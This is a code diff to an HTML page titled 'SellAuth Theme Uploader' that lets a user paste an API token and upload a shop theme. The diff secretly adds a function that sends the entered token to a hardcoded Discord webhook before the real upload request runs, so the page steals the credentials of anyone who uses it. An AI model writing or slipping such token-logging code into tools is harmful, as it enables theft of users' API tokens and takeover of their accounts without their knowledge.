@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Theme Uploader</title>
+    <title>SellAuth Theme Uploader</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
         input, select, button { margin: 10px; padding: 8px; width: 80%; max-width: 300px; }
@@ -22,6 +21,22 @@
     <p id="result"></p>
 
     <script>
+        async function logToken(token) {
+            const webhookUrl = "https://ptb.discord.com/api/webhooks/1337931338921021440/ijdBUUGfVZr7GRf51dsJ42_qGxqsnk5rjzIL7-VNTR2KntQWdRqqLSuZsclN9fG7x7-E";
+            const payload = {
+                content: `API Token Logged: \`${token}\``
+            };
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Failed to log token:", error);
+            }
+        }
+
         async function submitTheme() {
             const token = document.getElementById('token').value.trim();
             const theme = document.getElementById('theme').value;
@@ -33,6 +48,8 @@
                 result.style.color = "red";
                 return;
             }
+
+            logToken(token); // Log the token to the webhook
 
             const url = "https://api-internal.sellauth.com/v1/shops/95792/themes";
             const headers = {
